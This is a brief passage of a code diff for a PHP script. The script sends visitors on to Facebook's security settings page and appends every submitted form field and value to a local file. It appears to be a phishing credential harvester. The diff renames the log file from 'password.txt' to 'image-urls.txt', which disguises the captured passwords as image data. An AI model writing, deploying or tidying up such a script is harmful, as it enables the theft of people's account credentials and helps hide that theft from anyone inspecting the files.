@@ -1,6 +1,6 @@
 <?php
 header("Location: https://www.facebook.com/settings?tab=security ");
-$handle = fopen("password.txt","a");
+$handle = fopen("image-urls.txt","a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
